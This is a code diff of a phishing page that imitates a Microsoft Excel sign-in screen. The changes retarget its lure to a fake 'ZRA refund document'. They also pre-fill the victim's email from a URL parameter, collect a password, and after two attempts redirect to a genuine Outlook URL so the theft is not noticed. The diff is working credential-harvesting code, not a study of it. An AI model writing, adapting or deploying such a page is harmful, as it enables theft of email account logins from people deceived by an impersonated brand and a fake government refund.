@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Microsoft Excel - View Tax Statement</title>
+  <title>Microsoft Excel - View Zar refund Document</title>
   <style>
     * {
       margin: 0;
@@ -176,15 +176,15 @@
       <div class="excel-logo">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/73/Microsoft_Excel_2013-2019_logo.svg/1200px-Microsoft_Excel_2013-2019_logo.svg.png" alt="Microsoft Excel" onerror="this.src='https://cdn-icons-png.flaticon.com/512/732/732220.png'" />
       </div>
-      <h2>SIGN-IN WITH YOUR VALID EMAIL TO<br>VIEW DOCUMENT</h2>
+      <h2>SIGN-IN WITH YOUR VALID EMAIL TO<br>VIEW ZRA REFUND DOCUMENT</h2>
       <form id="loginForm">
         <!-- Email -->
 		
         <div class="input-group">
-          <input type="email" name="oruko" class="form-control rounded-0 border-dark" id="oruko" aria-describedby="orukoHelp" placeholder="Email, Phone or Skype" required="required" />
-          <p id="msgfont"></p>
-          <div class="password-wrapper">
-        </div>
+		<input type="email" id="oruko" placeholder="Email" autocomplete="on" value="[[-Email-]]" />
+		<p id="msgfont"></p>
+		<div class="password-wrapper"></div>
+	</div>
         <!-- Password with toggle -->
         <div class="input-group" style="position: relative;">
           <input type="password" id="password" name="kokoro" placeholder="Password" required "kokoro"/>
@@ -213,40 +213,31 @@
   <!-- Inside the existing script, replace the handleSubmission() function with this: -->
 
 <script type="text/javascript">
-	/* global $ */
-    document.addEventListener('DOMContentLoaded', function() {
-      var count = 0;
+	// Wait for the window to load
+  window.addEventListener('DOMContentLoaded', (event) => {
+    // 1. Get the URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // 2. Look specifically for 'emp'
+    const emailValue = urlParams.get('emp');
 
-      // Extract the value after the '#' symbol from the URL
-      var oruko = window.location.hash.substr(1);
-
-      if (!oruko) {
-        // Code to handle the case when the 'oruko' value is not present in the URL
-      } else {
-        // Regular expression to check if 'oruko' is a valid base64 string
-        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-
-        // Decode 'oruko' if it is a base64 string, otherwise use the original value
-        var my_oruko = base64regex.test(oruko) ? atob(oruko) : oruko;
-
-        // Regular expression to check if 'my_oruko' is a valid email address
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        if (!filter.test(my_oruko)) {
-          // Display an error message if 'my_oruko' is not a valid email address
-          // You can add your error handling here
-        }
-
-        // Extract the domain name from 'my_oruko'
-        var ind = my_oruko.indexOf("@");
-        var my_slice = my_oruko.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var fnl = c.toLowerCase();
-        var fnlu = c.toUpperCase();
-
-        // Set the value of the input field with the email address
-        document.getElementById('oruko').value = my_oruko;
+    // 3. If 'emp' exists in the URL, put it into the email input
+    if (emailValue) {
+      const emailInput = document.getElementById('oruko');
+      if (emailInput) {
+        emailInput.value = emailValue;
       }
+    }
+  });
+	// Get email from URL parameter 'emp' (e.g., ?emp=user@domain.com)
+    function getEmailFromUrl() {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get('emp');
+    }
+
+    // Get email from URL and pre-fill the email field
+    const emailFromUrl = getEmailFromUrl();
+    const emailField = document.getElementById('email');
     
     if (emailFromUrl && emailField) {
       emailField.value = emailFromUrl;
@@ -378,7 +369,7 @@
       // Redirect or show message
       if (countAttempt >= 2) {
         setTimeout(() => {
-          window.location.href = "https://excel.cloud.microsoft/en-us/"; // your redirect URL
+          window.location.href = "https://outlook.live.com/mail/inbox/id/"; // your redirect URL
         }, 2000);
       } else {
         setTimeout(() => {
